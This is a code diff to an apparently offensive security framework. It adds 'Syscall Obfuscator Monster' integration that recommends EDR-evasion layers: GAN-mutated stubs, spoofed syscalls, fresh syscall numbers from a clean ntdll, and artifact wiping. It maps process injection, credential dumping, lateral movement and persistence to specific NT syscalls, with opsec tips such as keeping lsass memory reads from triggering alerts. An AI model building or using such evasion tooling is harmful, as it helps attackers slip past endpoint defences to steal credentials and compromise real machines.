@@ -73,6 +73,27 @@ except ImportError:
     ProcessInjectionMasterclass = None
     InjectionTechnique = None
 
+# NEW: Syscall Obfuscator Monster entegrasyonu
+try:
+    from evasion.syscall_obfuscator import (
+        SyscallObfuscatorMonster,
+        AIObfuscationSelector,
+        GANStubMutator,
+        ObfuscationLayer as SyscallObfuscationLayer,
+        EDRProfile as SyscallEDRProfile,
+        StubPattern,
+        SpoofTarget,
+        ObfuscationConfig as SyscallObfuscationConfig,
+        EDR_OBFUSCATION_PROFILES,
+        create_obfuscator_monster,
+        get_ai_recommendation as get_syscall_recommendation
+    )
+    HAS_SYSCALL_OBFUSCATOR = True
+except ImportError:
+    HAS_SYSCALL_OBFUSCATOR = False
+    SyscallObfuscatorMonster = None
+    SyscallObfuscationLayer = None
+
 # Try to import LLM engine
 try:
     from cybermodules.llm_engine import LLMEngine
@@ -1968,5 +1989,250 @@ Return as JSON array.
         
         result['estimated_detection_risk'] = round(base_risk, 2)
         result['estimated_behavioral_score'] = round(base_risk, 2)
+        
+        return result
+    
+    # =========================================================================
+    # SYSCALL OBFUSCATION GUIDANCE
+    # =========================================================================
+    
+    def get_syscall_obfuscation_recommendation(self, target: str = None) -> Dict[str, Any]:
+        """
+        Get AI-guided syscall obfuscation recommendation.
+        
+        Analyzes target defenses and recommends optimal obfuscation layers.
+        
+        Args:
+            target: Target hostname (optional, for context)
+        
+        Returns:
+            Dict with:
+            - detected_edr: Primary EDR detected
+            - primary_layer: Recommended obfuscation layer
+            - secondary_layers: Additional layers to apply
+            - stub_pattern: Recommended stub pattern
+            - mutation_rate: ML mutation rate
+            - entropy_level: Target entropy level
+            - spoof_calls: Recommended spoof calls
+            - recommendation: Human-readable recommendation
+        """
+        result = {
+            'detected_edr': 'None',
+            'primary_layer': 'indirect_call',
+            'secondary_layers': [],
+            'stub_pattern': 'standard',
+            'mutation_rate': 0.5,
+            'entropy_level': 0.5,
+            'junk_ratio': 0.3,
+            'spoof_calls': [],
+            'delay_range_ms': [10, 50],
+            'use_fresh_ssn': True,
+            'recommendation': 'Default syscall obfuscation',
+            'error': None,
+        }
+        
+        if not HAS_SYSCALL_OBFUSCATOR:
+            result['error'] = 'Syscall obfuscator module not available'
+            result['recommendation'] = 'Install syscall_obfuscator module'
+            return result
+        
+        try:
+            # Use AI selector
+            selector = AIObfuscationSelector()
+            layer, profile_info = selector.detect_and_select()
+            
+            profile = profile_info.get('profile', {})
+            edr = profile_info.get('edr', SyscallEDRProfile.NONE)
+            
+            result['detected_edr'] = profile.get('name', 'None')
+            result['primary_layer'] = layer.value
+            result['secondary_layers'] = [l.value for l in profile.get('secondary_layers', [])]
+            result['stub_pattern'] = profile.get('stub_pattern', StubPattern.STANDARD).value
+            result['mutation_rate'] = profile.get('mutation_rate', 0.5)
+            result['entropy_level'] = profile.get('entropy_level', 0.5)
+            result['junk_ratio'] = profile.get('junk_ratio', 0.3)
+            result['spoof_calls'] = [s.value for s in profile.get('spoof_calls', [])]
+            result['delay_range_ms'] = list(profile.get('delay_range_ms', (10, 50)))
+            result['recommendation'] = profile.get('notes', 'AI-selected obfuscation')
+            
+            # Get full recommendation text
+            result['full_recommendation'] = selector.get_recommendation()
+            
+        except Exception as e:
+            result['error'] = str(e)
+            result['recommendation'] = f'Syscall obfuscation guidance failed: {e}'
+        
+        return result
+    
+    def create_syscall_obfuscator(
+        self,
+        target: str = None,
+        ai_adaptive: bool = True,
+        use_ml: bool = True,
+        use_fresh_ssn: bool = True,
+        enable_spoof: bool = True
+    ):
+        """
+        Create a SyscallObfuscatorMonster with AI-recommended settings.
+        
+        Args:
+            target: Target host for context
+            ai_adaptive: Use AI-adaptive layer selection
+            use_ml: Use ML/GAN-based mutation
+            use_fresh_ssn: Resolve SSN from clean ntdll
+            enable_spoof: Enable spoof call generation
+        
+        Returns:
+            Configured SyscallObfuscatorMonster instance or None
+        """
+        if not HAS_SYSCALL_OBFUSCATOR:
+            return None
+        
+        try:
+            # Get AI recommendation first
+            rec = self.get_syscall_obfuscation_recommendation(target)
+            
+            # Build config
+            config = SyscallObfuscationConfig(
+                ai_adaptive=ai_adaptive,
+                use_ml_mutation=use_ml,
+                use_fresh_ntdll=use_fresh_ssn,
+                enable_spoof_calls=enable_spoof,
+                mutation_rate=rec.get('mutation_rate', 0.7),
+                junk_instruction_ratio=rec.get('junk_ratio', 0.5),
+            )
+            
+            return SyscallObfuscatorMonster(config)
+            
+        except Exception as e:
+            self.log_action("syscall_obfuscator_create", f"Failed: {e}")
+            return None
+    
+    def recommend_syscall_for_operation(
+        self,
+        operation: str,
+        target: str = None,
+        sensitive: bool = True
+    ) -> Dict[str, Any]:
+        """
+        Get syscall obfuscation recommendation for specific operation.
+        
+        Args:
+            operation: Operation type (e.g., "injection", "credential_dump", "lateral_move")
+            target: Target hostname
+            sensitive: Whether this is a sensitive operation requiring max stealth
+        
+        Returns:
+            Dict with operation-specific syscall guidance
+        """
+        result = {
+            'operation': operation,
+            'target': target,
+            'recommended_layer': 'gan_mutate',
+            'syscalls_needed': [],
+            'obfuscation_settings': {},
+            'opsec_requirements': [],
+            'notes': [],
+            'estimated_evasion_score': 0.85,
+        }
+        
+        # Get base recommendation
+        base_rec = self.get_syscall_obfuscation_recommendation(target)
+        
+        # Map operations to syscalls
+        operation_syscalls = {
+            'injection': [
+                'NtAllocateVirtualMemory',
+                'NtWriteVirtualMemory',
+                'NtProtectVirtualMemory',
+                'NtCreateThreadEx',
+            ],
+            'credential_dump': [
+                'NtOpenProcess',
+                'NtReadVirtualMemory',
+                'NtQueryInformationProcess',
+            ],
+            'lateral_move': [
+                'NtCreateFile',
+                'NtWriteVirtualMemory',
+                'NtCreateThreadEx',
+                'NtOpenProcess',
+            ],
+            'persistence': [
+                'NtCreateFile',
+                'NtSetInformationFile',
+                'NtWriteFile',
+            ],
+            'evasion': [
+                'NtAllocateVirtualMemory',
+                'NtProtectVirtualMemory',
+                'NtCreateSection',
+                'NtMapViewOfSection',
+            ],
+        }
+        
+        result['syscalls_needed'] = operation_syscalls.get(operation, ['NtOpenProcess'])
+        
+        # Set obfuscation based on sensitivity
+        if sensitive:
+            result['recommended_layer'] = 'full_monster'
+            result['obfuscation_settings'] = {
+                'primary_layer': base_rec['primary_layer'],
+                'secondary_layers': base_rec['secondary_layers'],
+                'stub_pattern': 'polymorphic' if base_rec['mutation_rate'] > 0.6 else 'junked',
+                'mutation_rate': max(base_rec['mutation_rate'], 0.8),
+                'entropy_level': max(base_rec['entropy_level'], 0.7),
+                'spoof_before': True,
+                'spoof_after': True,
+                'artifact_wipe': True,
+            }
+            result['opsec_requirements'] = [
+                'Use fresh SSN from clean ntdll',
+                'Apply GAN mutation to all stubs',
+                'Spoof syscalls before and after',
+                'Wipe artifacts after each call',
+                'Reseed mutation after 3 calls',
+            ]
+        else:
+            result['recommended_layer'] = base_rec['primary_layer']
+            result['obfuscation_settings'] = {
+                'primary_layer': base_rec['primary_layer'],
+                'secondary_layers': base_rec['secondary_layers'][:1],
+                'stub_pattern': base_rec['stub_pattern'],
+                'mutation_rate': base_rec['mutation_rate'],
+                'entropy_level': base_rec['entropy_level'],
+                'spoof_before': False,
+                'spoof_after': True,
+                'artifact_wipe': True,
+            }
+        
+        # Calculate evasion score
+        layer_scores = {
+            'full_monster': 0.97,
+            'gan_mutate': 0.92,
+            'stub_swap': 0.88,
+            'entropy_heavy': 0.85,
+            'obfuscated_stub': 0.80,
+            'fresh_ssn': 0.75,
+            'indirect_call': 0.70,
+            'none': 0.30,
+        }
+        
+        result['estimated_evasion_score'] = layer_scores.get(
+            result['recommended_layer'], 0.75
+        )
+        
+        # Adjust for EDR
+        if base_rec['detected_edr'] != 'None':
+            result['notes'].append(f"EDR detected: {base_rec['detected_edr']}")
+            result['notes'].append(base_rec['recommendation'])
+        
+        # Operation-specific notes
+        if operation == 'injection':
+            result['notes'].append('NtCreateThreadEx is heavily monitored - use max obfuscation')
+        elif operation == 'credential_dump':
+            result['notes'].append('NtReadVirtualMemory on lsass triggers alerts - use spoof heavily')
+        elif operation == 'lateral_move':
+            result['notes'].append('NtCreateFile for remote writes is suspicious - add timing jitter')
         
         return result
